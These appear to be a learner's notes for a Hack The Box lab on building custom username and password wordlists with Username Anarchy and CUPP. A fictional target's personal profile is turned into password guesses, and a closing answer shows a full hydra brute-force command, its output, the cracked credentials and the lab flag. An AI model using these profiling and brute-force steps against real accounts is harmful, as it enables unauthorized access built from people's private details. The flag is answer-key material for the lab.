# Custom Wordlists
## Username Anarchy
This is where Username Anarchy shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username:

```sh
masterofblafu@htb[/htb]$ ./username-anarchy -l

Plugin name             Example
--------------------------------------------------------------------------------
first                   anna
firstlast               annakey
first.last              anna.key
firstlast[8]            annakey
first[4]last[4]         annakey
firstl                  annak
f.last                  a.key
flast                   akey
lfirst                  kanna
l.first                 k.anna
lastf                   keya
last                    key
last.f                  key.a
last.first              key.anna
FLast                   AKey
first1                  anna0,anna1,anna2
fl                      ak
fmlast                  abkey
firstmiddlelast         annaboomkey
fml                     abk
FL                      AK
FirstLast               AnnaKey
First.Last              Anna.Key
Last                    Key

```

First, install ruby, and then pull the `Username Anarchy` git to get the script:

```sh
masterofblafu@htb[/htb]$ sudo apt install ruby -y
masterofblafu@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
masterofblafu@htb[/htb]$ cd username-anarchy
```

Next, execute it with the target's first and last names. This will generate possible username combinations.

```sh
masterofblafu@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## CUPP
With the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is where `CUPP` (Common User Passwords Profiler) steps in, a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.

For example, let's say you have put together this profile based on Jane Smith's Facebook postings.

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Field</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Details</th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Name</td><td class="p-4">Jane Smith</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Nickname</td><td class="p-4">Janey</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Birthdate</td><td class="p-4">December 11, 1990</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Relationship Status</td><td class="p-4">In a relationship with Jim</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Partner's Name</td><td class="p-4">Jim (Nickname: Jimbo)</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Partner's Birthdate</td><td class="p-4">December 12, 1990</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Pet</td><td class="p-4">Spot</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Company</td><td class="p-4">AHI</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Interests</td><td class="p-4">Hackers, Pizza, Golf, Horses</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4">Favorite Colors</td><td class="p-4">Blue</td></tr></tbody></table>

CUPP will then take your inputs and create a comprehensive list of potential passwords:

- Original and Capitalized: `jane`, `Jane`
- Reversed Strings: `enaj`, `enaJ`
- Birthdate Variations: `jane1994`, `smith2708`
- Concatenations: `janesmith`, `smithjane`
- Appending Special Characters: `jane!`, `smith@`
- Appending Numbers: `jane123`, `smith2024`
- Leetspeak Substitutions: `j4n3`, `5m1th`
- Combined Mutations: `Jane1994!`, `smith2708@`

Install: 

```sh
masterofblafu@htb[/htb]$ sudo apt install cupp -y
```

Invoke CUPP in interactive mode, CUPP will guide you through a series of questions about your target, enter the following as prompted:

```sh
masterofblafu@htb[/htb]$ cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```

CUPP has generated many possible passwords for us, but Jane's company, AHI, has a rather odd password policy.

- Minimum Length: 6 characters
- Must Include:
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number
    - At least two special characters (from the set `!@#$%^&*`)

As we did earlier, we can use grep to filter that password list to match that policy:

```sh
masterofblafu@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

## Questions
1. After successfully brute-forcing, and then logging into the target, what is the full flag you find? **Answer: HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}**
   - Follow the steps above and run hydra against the target → found credentials `jane`:`3n4J!!`
        ```sh
        $ hydra -L jane_smith_usernames.txt -P jane-filtered.txt 154.57.164.68 -s 32161 -f http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
        Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 03:54:54
        [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
        [DATA] max 16 tasks per 1 server, overall 16 tasks, 111286 login tries (l:14/p:7949), ~6956 tries per task
        [DATA] attacking http-post-form://154.57.164.68:32161/:username=^USER^&password=^PASS^:F=Invalid credentials
        [32161][http-post-form] host: 154.57.164.68   login: jane   password: 3n4J!!
        ```
   - Login and read the flag